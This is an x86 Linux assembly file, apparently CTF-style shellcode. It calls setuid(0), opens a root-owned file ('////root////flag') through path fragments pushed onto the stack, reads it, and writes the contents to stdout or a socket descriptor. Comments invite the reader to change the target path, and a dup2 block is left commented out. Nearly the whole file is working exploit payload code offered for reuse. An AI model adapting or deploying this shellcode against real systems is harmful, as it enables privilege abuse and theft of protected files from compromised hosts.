
##########################################################################################
#   readfile     -  read file content and write into dst_fd
#   @f_strN    :  filepath fragments , 4 bytes aligned
#   @write_fd :  file descriptor , maybe a socket descriptor or STDOUT
#   @r_size     :  read bytes      
#
#   author      :  random  
#   date         :  2014-04-20
#
#   compile  :  as read_file.s -o read_file.o && ld read_file.o -o read_file || echo oops
#########################################################################################


#file path fragments, 4 bytes aligned
.set f_str1, 0x67616C66   #"flag"
.set f_str2, 0x2F2F2F2F   #"////"
.set f_str3, 0x746F6F72   #"root"
.set f_str4, 0x2F2F2F2F   #"////"
#!!! alter or append filepath here if nessesary !!!!#

# write file descriptor ,assume STDOUT=0x01,maybe socket descriptor
.set write_fd, 0x01         # 1 byte

# read size, 0x20 bytes default
.set r_size, 0x0101       #uint16_t


#code 

.text

.global _start

_start:

# init
xor   %eax,%eax
xor   %ebx,%ebx
xor   %ecx,%ecx
xor   %edx,%edx

#setuid(0)
movb  $0x17,%al     #setuid 0x17 = 23
int   $0x80

# open("////root////flag",O_RDONLY=0)
push  %eax          # null
#!!!!!! change filepath here !!!!!!#
push  $f_str1       #"flag"
push  $f_str2       #"////"
push  $f_str3       #"root"
push  $f_str4       #"////"
mov   %esp,%ebx
xor   %ecx,%ecx     # O_RDONLY = 0
movb  $0x05,%al     # open
int   $0x80          
mov   %eax,%esi     # esi stores file descriptor


# read(fd,esp-0x100,r_size)
subw  $r_size,%sp
mov   %esi,%ebx
mov   %esp,%ecx
movw  $r_size,%dx
movb  $0x03,%al     # read
int   $0x80


# write(sockfd,esp-0x100,0x100)
xor   %ebx,%ebx
movb  $write_fd,%bl
mov   %esp,%ecx
mov   %eax,%edx
xor   %eax,%eax
movb  $0x04,%al
int   $0x80

# exit
xor   %eax,%eax
inc   %eax          # exit
movb  $0x01,%bl       
int   $0x80            

#dup2(fd, sockfd = 1)
#mov  %esi,%ebx
#xor  %ecx,%ecx
#movb dst_fd,%cl    # ecx = sockfd 
#xor  %eax,%eax
#movb $0x3F,%al     #dup2 = 63 = 0x3F
#int  $0x80
